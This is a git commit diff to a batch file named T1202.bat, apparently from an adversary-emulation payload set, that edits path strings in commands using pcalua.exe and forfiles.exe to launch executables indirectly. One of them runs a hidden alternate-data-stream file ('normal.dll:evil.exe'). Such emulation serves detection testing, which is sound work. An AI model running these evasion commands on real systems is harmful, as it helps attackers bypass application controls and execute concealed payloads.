bcac1980d500b9faf30b93a7b353789e0a478527
rajrakeshdr <raj.rakeshdr@gmail.com>
2023-11-14 15:05:14 +0530

    Update T1202.bat

--- Payloads/T1202/T1202.bat
+++ Payloads/T1202/T1202.bat
@@ -9,12 +9,12 @@ ECHO.
 ECHO [+] Leveraging 'PCALUA.EXE' to execute binaries
 ECHO -------------------------------------------------------------------
 pcalua.exe -a calc.exe
-pcalua.exe -a %EXFIL%\payload.dll
+pcalua.exe -a %EXFIL%payload.dll
 pcalua.exe -a C:\Windows\system32\javacpl.cpl -c Java
 ECHO.
 
 ECHO [+] Leveraging 'FORFILES.EXE' to execute binaries
 ECHO -------------------------------------------------------------------
 forfiles /p C:\windows\system32 /m notepad.exe /c calc.exe
-forfiles /p C:\windows\system32 /m notepad.exe /c "%EXFIL%\normal.dll:evil.exe"
+forfiles /p C:\windows\system32 /m notepad.exe /c "%EXFIL%normal.dll:evil.exe"
 ECHO.
